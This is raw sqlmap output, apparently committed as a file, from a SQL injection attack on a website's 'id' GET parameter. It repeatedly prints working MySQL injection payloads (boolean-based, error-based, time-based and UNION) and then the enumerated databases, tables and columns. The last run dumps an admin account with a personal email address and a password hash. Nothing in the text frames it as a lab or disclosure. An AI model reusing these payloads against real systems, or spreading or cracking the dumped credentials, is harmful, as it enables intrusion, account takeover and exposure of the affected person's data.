@@ -1,0 +1,260 @@
+sqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=6' AND 6449=6449 AND 'VJuS'='VJuS
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=6' AND (SELECT 4325 FROM(SELECT COUNT(*),CONCAT(0x717a706a71,(SELECT (ELT(4325=4325,1))),0x71716b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'DLdp'='DLdp
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=6' AND (SELECT 6374 FROM (SELECT(SLEEP(5)))iOxK) AND 'uFPH'='uFPH
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: id=6' UNION ALL SELECT NULL,CONCAT(0x717a706a71,0x61796a72616f6345725a4f677241514c494e626a514c42676c57546b72645a6a6171626c7671496a,0x71716b7871),NULL,NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Linux
+web application technology: Apache, PHP, Plesk
+back-end DBMS: MySQL >= 5.0
+available databases [8]:
+[*] apsc
+[*] horde
+[*] information_schema
+[*] mysql
+[*] phpmyadmin_38Dqey2QMmW9
+[*] psa
+[*] sitebuilder5
+[*] ubraintv
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=6' AND 6449=6449 AND 'VJuS'='VJuS
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=6' AND (SELECT 4325 FROM(SELECT COUNT(*),CONCAT(0x717a706a71,(SELECT (ELT(4325=4325,1))),0x71716b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'DLdp'='DLdp
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=6' AND (SELECT 6374 FROM (SELECT(SLEEP(5)))iOxK) AND 'uFPH'='uFPH
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: id=6' UNION ALL SELECT NULL,CONCAT(0x717a706a71,0x61796a72616f6345725a4f677241514c494e626a514c42676c57546b72645a6a6171626c7671496a,0x71716b7871),NULL,NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Linux
+web application technology: Apache, Plesk
+back-end DBMS: MySQL >= 5.0
+Database: ubraintv
+[21 tables]
++---------------------+
+| advertisements      |
+| authorised_users    |
+| channels            |
+| donate_subscription |
+| events              |
+| events_subscription |
+| featured            |
+| friend_requests     |
+| friends             |
+| jpnews              |
+| library             |
+| messages            |
+| news                |
+| partners            |
+| speakers            |
+| tags                |
+| topspeakers         |
+| users               |
+| vid_views           |
+| videos              |
+| videos_all          |
++---------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=6' AND 6449=6449 AND 'VJuS'='VJuS
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=6' AND (SELECT 4325 FROM(SELECT COUNT(*),CONCAT(0x717a706a71,(SELECT (ELT(4325=4325,1))),0x71716b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'DLdp'='DLdp
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=6' AND (SELECT 6374 FROM (SELECT(SLEEP(5)))iOxK) AND 'uFPH'='uFPH
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: id=6' UNION ALL SELECT NULL,CONCAT(0x717a706a71,0x61796a72616f6345725a4f677241514c494e626a514c42676c57546b72645a6a6171626c7671496a,0x71716b7871),NULL,NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Linux
+web application technology: Apache, PHP, Plesk
+back-end DBMS: MySQL >= 5.0
+Database: ubraintv
+Table: users
+[25 columns]
++-----------------------+--------------+
+| Column                | Type         |
++-----------------------+--------------+
+| about                 | text         |
+| c_privacy             | int(11)      |
+| city                  | varchar(100) |
+| company               | varchar(200) |
+| cv                    | varchar(200) |
+| e_privacy             | int(11)      |
+| education             | varchar(200) |
+| email                 | varchar(150) |
+| iamlookingfor         | varchar(200) |
+| id                    | int(11)      |
+| jobtitle              | varchar(200) |
+| location              | varchar(100) |
+| name                  | varchar(100) |
+| p_privacy             | int(11)      |
+| password              | varchar(200) |
+| pastposition          | varchar(200) |
+| phone                 | text         |
+| professionalinterests | varchar(200) |
+| profilephoto          | varchar(200) |
+| referal               | varchar(200) |
+| status                | varchar(20)  |
+| statusupdate          | text         |
+| username              | varchar(100) |
+| w_privacy             | int(11)      |
+| website               | varchar(200) |
++-----------------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=6' AND 6449=6449 AND 'VJuS'='VJuS
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=6' AND (SELECT 4325 FROM(SELECT COUNT(*),CONCAT(0x717a706a71,(SELECT (ELT(4325=4325,1))),0x71716b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'DLdp'='DLdp
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=6' AND (SELECT 6374 FROM (SELECT(SLEEP(5)))iOxK) AND 'uFPH'='uFPH
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: id=6' UNION ALL SELECT NULL,CONCAT(0x717a706a71,0x61796a72616f6345725a4f677241514c494e626a514c42676c57546b72645a6a6171626c7671496a,0x71716b7871),NULL,NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Linux
+web application technology: Apache, PHP, Plesk
+back-end DBMS: MySQL >= 5.0
+Database: ubraintv
+Table: users
+[0 entries]
++-------+----------+----------+
+| -->   | username | password |
++-------+----------+----------+
++-------+----------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=6' AND 6449=6449 AND 'VJuS'='VJuS
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=6' AND (SELECT 4325 FROM(SELECT COUNT(*),CONCAT(0x717a706a71,(SELECT (ELT(4325=4325,1))),0x71716b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'DLdp'='DLdp
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=6' AND (SELECT 6374 FROM (SELECT(SLEEP(5)))iOxK) AND 'uFPH'='uFPH
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: id=6' UNION ALL SELECT NULL,CONCAT(0x717a706a71,0x61796a72616f6345725a4f677241514c494e626a514c42676c57546b72645a6a6171626c7671496a,0x71716b7871),NULL,NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Linux
+web application technology: Apache, PHP, Plesk
+back-end DBMS: MySQL >= 5.0
+Database: ubraintv
+Table: users
+[0 entries]
++----------+----------+
+| username | password |
++----------+----------+
++----------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=6' AND 6449=6449 AND 'VJuS'='VJuS
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=6' AND (SELECT 4325 FROM(SELECT COUNT(*),CONCAT(0x717a706a71,(SELECT (ELT(4325=4325,1))),0x71716b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'DLdp'='DLdp
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=6' AND (SELECT 6374 FROM (SELECT(SLEEP(5)))iOxK) AND 'uFPH'='uFPH
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: id=6' UNION ALL SELECT NULL,CONCAT(0x717a706a71,0x61796a72616f6345725a4f677241514c494e626a514c42676c57546b72645a6a6171626c7671496a,0x71716b7871),NULL,NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Linux
+web application technology: Apache, PHP, Plesk
+back-end DBMS: MySQL >= 5.0
+Database: ubraintv
+Table: authorised_users
+[4 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| email    | varchar(50) |
+| id       | int(11)     |
+| password | varchar(60) |
+| username | varchar(20) |
++----------+-------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=6' AND 6449=6449 AND 'VJuS'='VJuS
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=6' AND (SELECT 4325 FROM(SELECT COUNT(*),CONCAT(0x717a706a71,(SELECT (ELT(4325=4325,1))),0x71716b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'DLdp'='DLdp
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=6' AND (SELECT 6374 FROM (SELECT(SLEEP(5)))iOxK) AND 'uFPH'='uFPH
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: id=6' UNION ALL SELECT NULL,CONCAT(0x717a706a71,0x61796a72616f6345725a4f677241514c494e626a514c42676c57546b72645a6a6171626c7671496a,0x71716b7871),NULL,NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Linux
+web application technology: Apache, PHP, Plesk
+back-end DBMS: MySQL >= 5.0
+Database: ubraintv
+Table: authorised_users
+[1 entry]
++----------------------+----+----------+----------------------------------+
+| email                | id | username | password                         |
++----------------------+----+----------+----------------------------------+
+| shahzaib@hotmail.com | 1  | admin    | 325bf4e04f9dd5228c6217e6f6847463 |
++----------------------+----+----------+----------------------------------+
+
